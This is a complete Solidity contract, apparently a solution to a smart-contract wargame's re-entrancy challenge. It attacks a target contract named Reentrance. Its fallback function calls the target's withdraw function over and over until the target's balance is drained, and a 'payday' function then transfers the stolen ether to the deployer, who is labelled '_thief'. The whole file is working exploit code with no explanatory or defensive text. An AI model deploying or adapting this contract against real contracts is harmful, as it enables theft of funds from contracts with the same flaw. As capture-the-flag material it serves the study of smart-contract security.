pragma solidity ^0.4.18;

contract ReentrancyAttacker {
  Reentrance _reentrance;
  uint256 _donated;
  address _thief;

  function ReentrancyAttacker(address reentrance) public payable {
    _reentrance = Reentrance(reentrance);
    _thief = msg.sender;
    _donated = msg.value;
    _reentrance.donate.value(msg.value)(address(this));
  }

  function payday() public {
    uint256 balance = address(this).balance;
    _thief.transfer(balance);
  }

  function withdraw() public payable {
    _reentrance.withdraw(_donated);
  }

  function() public payable {
    uint256 balance = _reentrance.balance;
    if (balance > 0) {
      if (_donated > balance) {
        _reentrance.withdraw(balance);
      } else {
        _reentrance.withdraw(_donated);
      }
    }
  }
}